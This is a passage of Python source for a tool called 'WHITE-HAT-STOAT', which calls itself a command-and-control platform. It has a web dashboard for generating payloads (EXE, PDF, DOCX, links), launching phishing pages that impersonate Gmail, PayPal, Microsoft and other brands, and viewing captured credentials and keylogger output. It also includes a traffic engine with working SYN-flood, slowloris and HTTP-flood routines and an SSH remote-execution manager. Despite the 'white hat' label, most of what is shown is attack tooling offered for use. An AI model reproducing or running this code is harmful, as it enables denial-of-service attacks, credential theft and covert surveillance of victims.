                    var command = document.getElementById('command').value;
                    if (command) {
                        fetch('/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ command: command })
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                document.getElementById('command-output').innerHTML = 
                                    '<strong>Command:</strong> ' + command + '<br>' +
                                    '<strong>Output:</strong><br>' + data.output + '<br>' +
                                    '<strong>Time:</strong> ' + data.execution_time + 's';
                            } else {
                                document.getElementById('command-output').innerHTML = 
                                    '<strong>Error:</strong> ' + data.error;
                            }
                        });
                    }
                }
                
                function switchTab(tabName) {
                    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
                    document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
                    document.getElementById('tab-' + tabName).classList.add('active');
                    document.querySelector('[data-tab="' + tabName + '"]').classList.add('active');
                }
                
                function refreshStatus() {
                    fetch('/api/status')
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('stats').innerHTML = data.html;
                        });
                }
                
                function loadThreats() {
                    fetch('/api/threats')
                        .then(response => response.json())
                        .then(data => {
                            var html = '<table><thead><tr><th>Time</th><th>Type</th><th>Source IP</th><th>Severity</th></tr></thead><tbody>';
                            data.threats.forEach(function(threat) {
                                var severityClass = 'severity-' + threat.severity;
                                html += '<tr><td>' + threat.timestamp + '</td><td>' + threat.threat_type + '</td><td>' + threat.source_ip + '</td><td><span class="status-badge ' + severityClass + '">' + threat.severity + '</span></td></tr>';
                            });
                            html += '</tbody></table>';
                            document.getElementById('threats-table').innerHTML = html;
                        });
                }
                
                function loadKeylogs() {
                    fetch('/api/keylogs')
                        .then(response => response.json())
                        .then(data => {
                            var html = '<table><thead><tr><th>Time</th><th>Host</th><th>Text</th></tr></thead><tbody>';
                            data.keylogs.forEach(function(k) {
                                html += '<tr><td>' + k.timestamp + '</td><td>' + k.hostname + '</td><td>' + k.text.substring(0, 50) + '...</td></tr>';
                            });
                            html += '</tbody></table>';
                            document.getElementById('keylogs-table').innerHTML = html;
                        });
                }
                
                function refreshAll() {
                    refreshStatus();
                    loadThreats();
                    loadKeylogs();
                }
                
                setInterval(refreshAll, 5000);
                refreshAll();
            </script>
        </head>
        <body>
            <div class="header">
                <h1>🦡 WHITE-HAT-STOAT v1.0.0</h1>
                <p>Ultimate Cybersecurity Command & Control Platform</p>
            </div>
            <div class="container">
                <div class="stats-grid" id="stats"></div>
                
                <div class="tab-bar">
                    <div class="tab active" data-tab="command" onclick="switchTab('command')">🚀 Command Center</div>
                    <div class="tab" data-tab="payloads" onclick="switchTab('payloads')">💀 Payloads</div>
                    <div class="tab" data-tab="phishing" onclick="switchTab('phishing')">🎣 Phishing</div>
                    <div class="tab" data-tab="traffic" onclick="switchTab('traffic')">🚀 Traffic</div>
                    <div class="tab" data-tab="threats" onclick="switchTab('threats')">🛡️ Threats</div>
                    <div class="tab" data-tab="keylogs" onclick="switchTab('keylogs')">⌨️ Keylogs</div>
                </div>
                
                <div id="tab-command" class="tab-content active">
                    <div class="section">
                        <h2>🚀 Command Center</h2>
                        <input type="text" id="command" class="command-input" placeholder="Enter command (e.g., ping 8.8.8.8, nmap_quick 192.168.1.1, keylogger_start)" onkeypress="if(event.keyCode==13) executeCommand()">
                        <button onclick="executeCommand()">Execute Command</button>
                        <div id="command-output" class="output"></div>
                    </div>
                </div>
                
                <div id="tab-payloads" class="tab-content">
                    <div class="section">
                        <h2>💀 Payload Management</h2>
                        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
                            <button onclick="generatePayload('exe')">Generate EXE</button>
                            <button onclick="generatePayload('pdf')">Generate PDF</button>
                            <button onclick="generatePayload('docx')">Generate DOCX</button>
                            <button onclick="generatePayload('link')">Generate Link</button>
                            <button onclick="generatePayload('network')">Generate Network</button>
                        </div>
                        <div id="payload-output" class="output"></div>
                    </div>
                </div>
                
                <div id="tab-phishing" class="tab-content">
                    <div class="section">
                        <h2>🎣 Phishing Campaigns</h2>
                        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
                            <button onclick="phish('facebook')">Facebook</button>
                            <button onclick="phish('instagram')">Instagram</button>
                            <button onclick="phish('twitter')">Twitter</button>
                            <button onclick="phish('gmail')">Gmail</button>
                            <button onclick="phish('linkedin')">LinkedIn</button>
                            <button onclick="phish('github')">GitHub</button>
                            <button onclick="phish('microsoft')">Microsoft</button>
                            <button onclick="phish('apple')">Apple</button>
                            <button onclick="phish('amazon')">Amazon</button>
                            <button onclick="phish('paypal')">PayPal</button>
                        </div>
                        <div id="phishing-output" class="output"></div>
                    </div>
                </div>
                
                <div id="tab-traffic" class="tab-content">
                    <div class="section">
                        <h2>🚀 Traffic Generation</h2>
                        <div id="traffic-output" class="output"></div>
                    </div>
                </div>
                
                <div id="tab-threats" class="tab-content">
                    <div class="section">
                        <h2>🛡️ Threat Monitoring</h2>
                        <div id="threats-table"></div>
                    </div>
                </div>
                
                <div id="tab-keylogs" class="tab-content">
                    <div class="section">
                        <h2>⌨️ Keylogger Logs</h2>
                        <div id="keylogs-table"></div>
                    </div>
                </div>
            </div>
            
            <script>
                function generatePayload(type) {
                    fetch('/api/payload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ type: type })
                    })
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('payload-output').innerHTML = JSON.stringify(data, null, 2);
                    });
                }
                
                function phish(platform) {
                    fetch('/api/phish', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ platform: platform })
                    })
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('phishing-output').innerHTML = JSON.stringify(data, null, 2);
                    });
                }
            </script>
        </body>
        </html>
        '''
        
        @app.route('/')
        def index():
            return render_template_string(TEMPLATE)
        
        @app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web_user')
            socketio.emit('command_result', {
                'command': command,
                'output': result.get('output', '')[:1000],
                'execution_time': result.get('execution_time', 0)
            })
            return jsonify(result)
        
        @app.route('/api/payload', methods=['POST'])
        def api_payload():
            data = request.json
            payload_type = data.get('type', 'exe')
            name = data.get('name', f'payload_{int(time.time())}')
            
            payload_gen = PayloadGenerator(self.db, self.config)
            if payload_type == 'exe':
                payload = payload_gen.generate_exe(name)
            elif payload_type == 'pdf':
                payload = payload_gen.generate_pdf(name)
            elif payload_type == 'docx':
                payload = payload_gen.generate_docx(name)
            elif payload_type == 'link':
                payload = payload_gen.generate_link(name)
            elif payload_type == 'network':
                payload = payload_gen.generate_network_payload(name, 
                                                              data.get('target_ip', '127.0.0.1'),
                                                              data.get('target_port', 80))
            else:
                return jsonify({'success': False, 'error': f'Unknown payload type: {payload_type}'})
            
            return jsonify({
                'success': True,
                'payload_id': payload.id,
                'payload_type': payload.payload_type,
                'file_path': payload.file_path
            })
        
        @app.route('/api/phish', methods=['POST'])
        def api_phish():
            data = request.json
            platform = data.get('platform', 'custom')
            social = SocialEngineeringTools(self.db)
            result = social.generate_phishing_link(platform)
            return jsonify(result)
        
        @app.route('/api/status')
        def api_status():
            stats = self.db.get_statistics()
            html = f'''
                <div class="stat-card"><h3>{stats.get('total_commands', 0)}</h3><p>Commands Executed</p></div>
                <div class="stat-card"><h3>{stats.get('total_threats', 0)}</h3><p>Threats Detected</p></div>
                <div class="stat-card"><h3>{stats.get('blocked_ips', 0)}</h3><p>Blocked IPs</p></div>
                <div class="stat-card"><h3>{stats.get('captured_credentials', 0)}</h3><p>Credentials Captured</p></div>
                <div class="stat-card"><h3>{stats.get('total_payloads', 0)}</h3><p>Payloads Generated</p></div>
                <div class="stat-card"><h3>{stats.get('total_agents', 0)}</h3><p>Agents Connected</p></div>
                <div class="stat-card"><h3>{stats.get('total_keylogs', 0)}</h3><p>Keylogs Captured</p></div>
            '''
            return jsonify({'html': html})
        
        @app.route('/api/threats')
        def api_threats():
            threats = self.db.get_recent_threats(20)
            return jsonify({'threats': threats})
        
        @app.route('/api/keylogs')
        def api_keylogs():
            keylogs = self.db.get_keylogs(50)
            return jsonify({'keylogs': keylogs})
        
        @app.route('/api/stats')
        def api_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        self.app = app
        self.socketio = socketio
        return app
    
    def start(self):
        if not WEB_AVAILABLE:
            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
            return
        
        app = self.create_app()
        if app:
            port = self.config.get('web.port', 5000)
            host = self.config.get('web.host', '0.0.0.0')
            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id,
            name=name,
            host=host,
            port=port,
            username=username,
            password=password,
            key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected', last_used = CURRENT_TIMESTAMP WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            print(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        
        client = self.connections[conn_id]
        
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            
            self.db.log_ssh_command(conn_id, command, output, exit_code, execution_time)
            
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR ENGINE
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'tcp_fin': self._tcp_fin,
            'tcp_rst': self._tcp_rst,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random,
            'slowloris': self._slowloris,
            'psh_ack': self._psh_ack,
            'http_flood': self._http_flood
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _tcp_fin(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="F")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_rst(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="R")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"WHITE-HAT-STOAT"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"WHITE-HAT-STOAT", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "WHITE-HAT-STOAT"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "WHITE-HAT-STOAT"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_flood(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "WHITE-HAT-STOAT"})
            conn.getresponse()
            conn.close()
            return 200
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "WHITE-HAT-STOAT"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _slowloris(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + target.encode() + b"\r\n")
            sock.send(b"X-Header: " + os.urandom(8).hex().encode() + b"\r\n")
            time.sleep(1)
            return 50
        except:
            return 0
    
    def _psh_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="PA")/b"WHITE-HAT-STOAT"
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_flags = {
                "quick": ['-T4', '-F'],
                "full": ['-p-'],
                "service": ['-sV'],
                "os": ['-O'],
                "udp": ['-sU'],
                "vuln": ['--script', 'vuln'],
                "stealth": ['-sS', '-T2'],
                "snmp": ['-sU', '-p', '161', '--script', 'snmp-*'],
                "smb": ['-p', '445', '--script', 'smb-*'],
                "ssh": ['-p', '22', '--script', 'ssh-*'],
                "comprehensive": ['-sS', '-sV', '-sC', '-A', '-O']
            }
            
            flags = scan_flags.get(scan_type, ['-T4', '-F'])
            cmd = ['nmap'] + flags + [target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, headers: Dict = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['curl', '-s']
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            if method.upper() != "GET":
                cmd.extend(['-X', method.upper()])
            if data and method.upper() in ["POST", "PUT", "PATCH"]:
                cmd.extend(['-d', data])
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=WHS_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=WHS_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_available()
    
    def _check_available(self) -> bool:
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            if options.get('evasion'):
                cmd.extend(['-evasion', str(options['evasion'])])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            
            self.db.log_nikto_scan(target, vulnerabilities, output_file, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
                 keylogger: KeyloggerModule = None, payload_gen: PayloadGenerator = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.keylogger = keylogger
        self.payload_gen = payload_gen
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # Keylogger Commands
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            
            # Payload Commands
            'payload_gen': self._payload_gen,
            'payload_list': self._payload_list,
            'payload_deploy': self._payload_deploy,
            'payload_exe': self._payload_exe,
            'payload_pdf': self._payload_pdf,
            'payload_docx': self._payload_docx,
            'payload_link': self._payload_link,
            'payload_network': self._payload_network,
            
            # Ping Commands
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            
            # Nmap Commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_snmp': self._nmap_snmp,
            'nmap_smb': self._nmap_smb,
            'nmap_ssh': self._nmap_ssh,
            
            # Curl Commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic Generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # Nikto Commands
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            
            # Social Engineering
            'phish': self._phish,
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            
            # Network Commands
            'traceroute': self._traceroute,
            'whois': self._whois,
            'dns': self._dns,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            
            # Help
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
